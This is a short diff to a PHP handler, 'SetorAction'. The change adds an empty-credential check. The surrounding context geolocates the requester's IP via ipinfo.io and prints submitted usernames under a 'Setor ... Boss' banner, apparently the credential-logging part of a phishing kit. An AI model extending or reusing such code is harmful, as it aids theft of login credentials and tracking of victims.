@@ -37,6 +37,11 @@ final class SetorAction
             file_get_contents("http://ipinfo.io/{$ip}/json")
         );
 
+        if(empty($args['username'] && $args['password'])) {
+            $response->getBody()->write('Can\'t empty');
+            return $response;
+        }
+
         ob_start();
         echo "===== Setor {$args['type']} Boss =====\n";
         echo 'Username: *' . $args['username'] . "*\n";
